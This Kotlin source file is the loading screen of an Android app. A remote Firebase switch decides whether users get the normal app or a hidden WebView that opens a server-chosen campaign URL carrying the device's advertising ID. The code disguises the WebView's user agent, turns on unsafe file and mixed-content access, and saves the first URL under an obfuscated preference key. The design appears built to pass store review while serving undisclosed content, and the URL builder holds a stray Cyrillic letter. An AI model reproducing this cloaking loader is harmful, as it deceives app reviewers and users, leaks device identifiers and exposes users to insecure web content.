package il.spotrambs.iplay

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.airbnb.lottie.LottieAnimationView
import com.airbnb.lottie.LottieProperty
import com.airbnb.lottie.model.KeyPath
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import il.spotrambs.iplay.data.Constants.ONESIGNAL_APP_ID
import il.spotrambs.iplay.data.FirebaseManager
import il.spotrambs.iplay.data.model.CampaignType
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext


class LoaderActivity : AppCompatActivity() {


    private lateinit var webView: WebView
    private lateinit var sharPref: SharedPreferences
    private val LOCATION_PERMISSION_REQUEST_CODE = 123
    private lateinit var firebaseManager: FirebaseManager
    private var link = ""


    @SuppressLint("SetJavaScriptEnabled", "MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loader)

        firebaseManager = FirebaseManager()
        sharPref = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        webView = WebView(this@LoaderActivity)

        val savedLink = sharPref.getString("wuehfwiuef", null)

        if (savedLink != null) {
            setupWebView(savedLink.toString(), "")
            Log.d("TAGGG", "preferencesManager.getLastVisitedPage().isNotEmpty()")
        } else {
            fetchAndHandleDataFromFirebase()
            Log.d("TAGGG", "fetchAndHandleDataFromFirebase")
        }
    }


    private fun fetchAndHandleDataFromFirebase() {
        firebaseManager.fetchDataFromFirebase { data ->
            if (data.workStatus) {
                        link = data.organics
                        Log.d("TAGGG", "countryCodeFromApi == countryCodeFromFirebase $link")
                CoroutineScope(Dispatchers.Main).launch {
                    val appsFlyerDataFetcher = AppsFlyerDataFetcher(this@LoaderActivity)
                    appsFlyerDataFetcher.startDataFetching()
                    val advertisingId = fetchAdvertisingId()
                    appsFlyerDataFetcher.conversionDataFlow.collect { data ->
                        data?.let { map ->
                            val campaignType = when (map["campaign"] as? String) {
                                null -> CampaignType.NEW_ACTIVITY
                                else -> CampaignType.WEBVIEW
                            }
                            handleCampaign(campaignType, map, advertisingId.toString())
                        }
                    }
                }

                setContentView(R.layout.activity_loader)

                if (!isPermissionGranted()) {
                    requestLocationPermission()
                }



                val lottieAnimationView: LottieAnimationView = findViewById(R.id.animationView)

                lottieAnimationView.addValueCallback(
                    KeyPath("Shape Layer 1", "**"),
                    LottieProperty.COLOR
                ) { Color.BLACK }

                lottieAnimationView.addValueCallback(
                    KeyPath("Shape Layer 2", "**"),
                    LottieProperty.COLOR
                ) { Color.BLACK }

                lottieAnimationView.addValueCallback(
                    KeyPath("Shape Layer 3", "**"),
                    LottieProperty.COLOR
                ) { Color.BLACK }


                lottieAnimationView.addValueCallback(
                    KeyPath("Shape Layer 4", "**"),
                    LottieProperty.COLOR
                ) { Color.BLACK }
            } else {
                startActivity(Intent(this@LoaderActivity, MainActivity::class.java))
                finish()
            }
                }
            }


    private fun setupWebView(url: String?, advertisingId: String) {
        val container = findViewById<FrameLayout>(R.id.canta)
        container.addView(webView)
        webView.settings.apply {
            javaScriptEnabled = true
            displayZoomControls = false
            builtInZoomControls = true
            setSupportZoom(true)
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            javaScriptCanOpenWindowsAutomatically = true
            cacheMode = WebSettings.LOAD_DEFAULT
            loadWithOverviewMode = true
            useWideViewPort = true
            domStorageEnabled = true
            allowContentAccess = true
            databaseEnabled = true
            allowFileAccess = true
            allowFileAccessFromFileURLs = true
            allowUniversalAccessFromFileURLs = true
            displayZoomControls = false
            userAgentString = userAgentString.replace("; wv", "").replace(" Version/4.0", "")
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                findViewById<LottieAnimationView>(R.id.animationView).visibility = View.GONE
                saveLastUrl(url)
                if (url != null) {
                    Log.d("TAGGG", "webViewClient saveLastUrl $url")
                }
            }
        }

        webView.webChromeClient = object : WebChromeClient() {}

        CookieManager.getInstance().apply {
            setAcceptCookie(true)
            setAcceptThirdPartyCookies(webView, true)
        }

        val savedLink = sharPref.getString("wuehfwiuef", null)

        Log.d("TAGGG", "handleCampaign saveUrl from pref $savedLink")

        if (savedLink != null) {
            webView.loadUrl(savedLink)
            Log.d("TAGGG", savedLink)
        } else {
            val builder = StringBuilder(link)
            builder.append("с=").append(url)
            builder.append("&ad=").append(advertisingId)
            val linkk = builder.toString()
            webView.loadUrl(linkk)
        }
    }

    private fun handleCampaign(campaignType: CampaignType, map: Map<String, Any>, advertisingId: String) {
        when (campaignType) {
            CampaignType.WEBVIEW -> {
                OneSignal.login(advertisingId)
                OneSignal.User.pushSubscription.optIn()
                val url = map["campaign"] as? String
                if (url != null) {
                    setupWebView(url, advertisingId)
                }
            }
            CampaignType.NEW_ACTIVITY -> {
                OneSignal.User.pushSubscription.optOut()
                startActivity(Intent(this@LoaderActivity, MainActivity::class.java))
                finish()
            }
        }
    }


    class AppsFlyerDataFetcher(private val context: Context) {
        private val mutableConversionDataFlow = MutableSharedFlow<MutableMap<String, Any>?>()
        val conversionDataFlow: Flow<MutableMap<String, Any>?> = mutableConversionDataFlow.asSharedFlow()
        private val appsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                CoroutineScope(Dispatchers.Default).launch {
                    mutableConversionDataFlow.emit(data)
                }
            }
            override fun onConversionDataFail(p0: String?) {
            }
            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }
            override fun onAttributionFailure(p0: String?) {
            }
        }
        init {
            AppsFlyerLib.getInstance().init("3LWCCY7NyKkcwPMoQyg7ME", appsFlyerConversionListener, context)
        }
        fun startDataFetching() {
            AppsFlyerLib.getInstance().start(context)
        }
    }
    private suspend fun fetchAdvertisingId(): String? {
        return try {
            val info = withContext(Dispatchers.IO) {
                AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
            }
            info.id
        } catch (e: Exception) {
            null
        }
    }

    private fun saveLastUrl(url: String?) {
        val isFirstOpening = sharPref.getString("wuehfwiuef", null) == null
        if (url != null && isFirstOpening) {
            sharPref.edit().putString("wuehfwiuef", url).apply()
        }
    }

    override fun onBackPressed() {
        if(webView.canGoBack()) {
            webView.goBack()
        }
    }
    private fun isPermissionGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestLocationPermission() {
        ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), LOCATION_PERMISSION_REQUEST_CODE)
    }
}
